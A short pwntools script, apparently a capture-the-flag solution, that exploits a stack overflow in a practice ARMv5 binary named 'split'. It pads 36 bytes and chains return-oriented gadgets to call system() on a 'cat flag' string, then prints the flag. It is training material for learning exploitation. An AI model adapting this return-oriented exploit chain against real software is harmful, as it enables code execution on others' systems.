#!/usr/bin/puthon3
from pwn import process, p32, log

shell = process("./split_armv5")

offset = 36
junk = b"A" * offset

pop_r3_pc = p32(0x103a4)
mov_r0_r3_pop_fp_pc = p32(0x10558)
cat_flag = p32(0x21041)
system = p32(0x103ec)

payload  = b""
payload += junk
payload += pop_r3_pc + cat_flag + mov_r0_r3_pop_fp_pc
payload += b"A" * 4
payload += system

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.success(f"Flag: {flag}")
